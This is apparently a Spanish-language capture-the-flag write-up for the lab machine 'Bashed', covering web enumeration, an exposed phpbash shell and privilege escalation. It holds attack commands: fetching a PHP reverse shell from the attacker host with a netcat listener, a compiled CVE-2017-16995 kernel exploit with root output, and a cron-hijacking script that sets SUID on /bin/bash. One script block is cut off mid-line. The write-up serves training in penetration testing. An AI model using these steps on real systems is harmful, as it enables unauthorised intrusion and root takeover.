# Bashed

![](../../../../~gitbook/image.md)Publicado: 27 de Mayo de 2025Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Bashed es una máquina Linux de dificultad fácil que simula un escenario realista de pentesting. La máquina presenta un servidor web Apache que aloja una página de desarrollo donde se menciona la herramienta phpbash, una consola web semi-interactiva diseñada para facilitar las pruebas de penetración.
#### Objetivos de aprendizaje:
- Reconocimiento web: Identificación y enumeración de servicios HTTP
- Fuzzing de directorios: Descubrimiento de recursos ocultos en aplicaciones web
- Explotación de herramientas web: Uso de phpbash para obtener acceso inicial
- Escalada de privilegios horizontal: Aprovechamiento de permisos sudo mal configurados
- Escalada de privilegios vertical: Dos métodos diferentes para obtener acceso root:Explotación de vulnerabilidades del kernel (CVE-2017-16995)
- Abuso de tareas programadas (cron jobs)

#### Escenario:
La máquina simula un entorno de desarrollo donde un desarrollador ha dejado expuesta una herramienta de testing (phpbash) que permite la ejecución remota de comandos. A través de una configuración incorrecta de permisos sudo y tareas programadas mal aseguradas, es posible escalar privilegios hasta obtener acceso completo al sistema.Esta máquina es ideal para principiantes que quieren aprender los fundamentos del pentesting web y la escalada de privilegios en sistemas Linux, proporcionando múltiples vectores de ataque y técnicas de explotación comunes en el mundo real.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP
http://10.10.10.68![](../../../../~gitbook/image.md)
Al acceder al servicio http del puerto 80 encontramos una web que habla de phpbash aunque no vemos gran cosa a priori.phpbash es una consola web independiente y semiinteractiva. Su principal objetivo es facilitar las pruebas de penetración donde las consolas inversas tradicionales no son posibles.Para que phpbash funcione correctamente, Javascript debe estar habilitado en el navegador del cliente. El equipo de destino también debe permitir la ejecución de la  función `shell_exec` de PHP, aunque es muy sencillo modificar el script para usar una función alternativa.
#### Fuzzing de directorios
Realizamos fuzzing de directorios y encontramos algunos recursos que podrían ser interesante analizar:Descubrimos en el recurso /dev está alojada la phpbash que se menciona en la web:![](../../../../~gitbook/image.md)Basta con acceder a http://10.10.10.68/dev/phpbash.php y podemos usar dicha funcionalidad:![](../../../../~gitbook/image.md)Dado que estamos dentro de un php bash, podemos intentar usar una reverse shell para conectarnos a nuestro host de ataque.Primero probamos con una bash reverse shell one liner pero parece que todo lo que tenga que ver con bash se filtra. Así usamos una php reverse shell de pentest monkey la disponibilizamos en nuestro host de ataque usando un servidor web en python:rev.phpA continuación la descargamos en la carpeta /uploads de la máquina:Iniciamos un listener con netcat en nuestro host de ataque:Accedemos a http://10.10.10.68/uploads/rev.php para lanzar la reverse shell y ganar acceso al host:![](../../../../~gitbook/image.md)
#### Mejora del tratamiento de la TTY

#### Initial foothold
Enumeramos los usuarios del directorio /home y obtenemos la primera flag:
#### Escalada de privilegios a root
Verificamos si hay algún comando que pueda ser ejecutado con más privilegio y comprobamos que el usuario www-data puede ejecutar cualquier comando como el usuario scriptmanager sin que se requiera la contraseña:Es decir, podríamos autenticarnos como usuario scriptmanager haciendo lo siguiente:Enumeramos la máquina y así a priori, revisando la versión del kernel vemos algo interesante:Una pequeña búsqueda nos permite encontrar varios exploits para el CVE: CVE-2017-16995https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c
https://www.exploit-db.com/exploits/41458El exploit está escrito en C y requiere ser compilado, pero no tenemos gcc en la máquina comprometida:Compilamos el exploit en nuestro host de ataque usando la flag --static para compilar el binario con todas las dependencias incluidas, por lo que no dependerá de la versión de glibc del sistema donde se ejecute. Ojo: esto puede aumentar mucho el tamaño del binarioA continuación lo transferimos usando un servidor web en pythonFinalmente ejecutamos el exploit y ganamos acceso como root
#### Escalada a root mediante mediante script
Buscamos en la máquina archivos cuyo propietario sea scriptmanager y excluimos de los resultados aquellos que estén relacionados con proc que no me interesan:![](../../../../~gitbook/image.md)Nos sale un directorio y un script que podría ser interesanteSi revisamos los permisos, vemos que scriptmanager es el propietario el script test.pyRevisando el contenido del script en python vemos que básicamente lo que hace es crear un archivo con nombre test.txt y escribe sobre él.Es probable que haya una tarea programada que haga que root ejecute el test.py y cree el archivo test.txt, ya que el propietario es root.¿Cómo podemos verificar esto? Podemos crearnos un script en bash que monitorice esto o usando pspy:Le damos permisos de ejecución y lanzamosTras unos segundos de espera vemos algo interesante:![](../../../../~gitbook/image.md)
Vemos que hay una tarea programada que hace root vaya al directorio /scripts y mediante un bucle busque todos aquellos scripts que tienen extensión .py y los lance.¿Cómo podríamos abusar de esto ahora que sabemos que root ejecuta el script test.py?
Existen varias formas, pero una sería usar por ejemplo la librería os de python y mediante una llamada al sistema asignar permisos SUID a la /bin/bash:test.pyTranscurridos unos segundos vemos como root ha ejecutado el script y ha cambiado el permiso de /bin/bash para que tenga el bit SUID:![](../../../../~gitbook/image.md)Ahora ya podríamos concedernos el privilegio como root lanzando simplemente el comando:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.10.68
PING 10.10.10.68 (10.10.10.68) 56(84) bytes of data.
64 bytes from 10.10.10.68: icmp_seq=1 ttl=63 time=45.0 ms
64 bytes from 10.10.10.68: icmp_seq=2 ttl=63 time=42.8 ms

--- 10.10.10.68 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.68 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
80
```

```
nmap -sC -sV -p$ports 10.10.10.68 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 17:20 CEST
Nmap scan report for 10.10.10.68
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

```

```
feroxbuster -u http://10.10.10.68 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
http://10.10.10.68/js/
http://10.10.10.68/uploads/
http://10.10.10.68/images/
http://10.10.10.68/css/
http://10.10.10.68/php/
http://10.10.10.68/dev/
http://10.10.10.68/fonts/
```

```
dirsearch -u http://10.10.10.68 -x 503

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.10.10.68/

[17:32:53] Scanning:
[17:32:54] 301 -   308B - /php  ->  http://10.10.10.68/php/
[17:32:56] 403 -   291B - /.php3
[17:32:56] 403 -   290B - /.php
[17:32:59] 200 -    8KB - /about.html
[17:33:06] 200 -     0B - /config.php
[17:33:06] 200 -    8KB - /contact.html
[17:33:06] 301 -   308B - /css  ->  http://10.10.10.68/css/
[17:33:09] 301 -   308B - /dev  ->  http://10.10.10.68/dev/
[17:33:09] 200 -    1KB - /dev/
[17:33:10] 301 -   310B - /fonts  ->  http://10.10.10.68/fonts/
[17:33:11] 200 -    2KB - /images/
[17:33:11] 301 -   311B - /images  ->  http://10.10.10.68/images/
[17:33:12] 200 -    8KB - /index.html
[17:33:12] 301 -   307B - /js  ->  http://10.10.10.68/js/
[17:33:12] 200 -    3KB - /js/
[17:33:15] 200 -   939B - /php/
[17:33:18] 403 -   299B - /server-status
[17:33:18] 403 -   300B - /server-status/
[17:33:20] 301 -   312B - /uploads  ->  http://10.10.10.68/uploads/
[17:33:20] 200 -    14B - /uploads/

Task Completed
```

```

```

```
python3 -m http.server 80
```

```
wget http://10.10.14.8/rev.php
```

```
nc -nlvp 443
```

```
script /dev/null -c bash
CTRL + Z (suspended)
stty raw -echo; fg
reset xterm

stty rows 33 columns 127
```

```
www-data@bashed:/home$ ls -la
total 16
drwxr-xr-x  4 root          root          4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
drwxr-xr-x  4 arrexel       arrexel       4096 Jun  2  2022 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager
```

```
www-data@bashed:/home$ cd arrexel/
www-data@bashed:/home/arrexel$ ls
user.txt
www-data@bashed:/home/arrexel$ cat user.txt
```

```
www-data@bashed:/opt$ sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/opt$
```

```
www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:~$ whoami
scriptmanager
scriptmanager@bashed:~$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
scriptmanager@bashed:~$
```

```
uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

```
gcc exploit.c -o pwn
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
```

```
gcc -static -o pwn exploit.c
```

```
python3 -m http.server 80
wget http://10.10.14.8/pwn
chmod +x pwn
```

```
scriptmanager@bashed:/tmp$ ./pwn
[.] namespace sandbox setup successfully
[.] disabling SMEP & SMAP
[.] scheduling 0xffffffff81064550(0x406e0)
[.] waiting for the timer to execute
[.] done
[.] SMEP & SMAP should be off now
[.] getting root
[.] executing 0x402897
[.] done
[.] should be root now
[.] checking if we got root
[+] got r00t ^_^
[!] don't kill the exploit binary, the kernel will crash
root@bashed:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

```
find / -user scriptmanager 2>/dev/null | grep -v "proc"
```

```
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May 27 09:42 test.txt
```

```
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

```
# !/bin/bash

old_process="$(ps -eo user,command)"

while true; do
new_process="$(ps -eo user,command)"
diff \
```
chmod +x procmon.sh
./procmon.sh
```

```
import os

os.system("chmod u+s /bin/bash")
```

```
/bin/bash -p
```

```
scriptmanager@bashed:/scripts$ /bin/bash -p
bash-4.3# id
uid=1001(scriptmanager) gid=1001(scriptmanager) euid=0(root) groups=1001(scriptmanager)
bash-4.3# cd /root
bash-4.3# cat root.txt
```
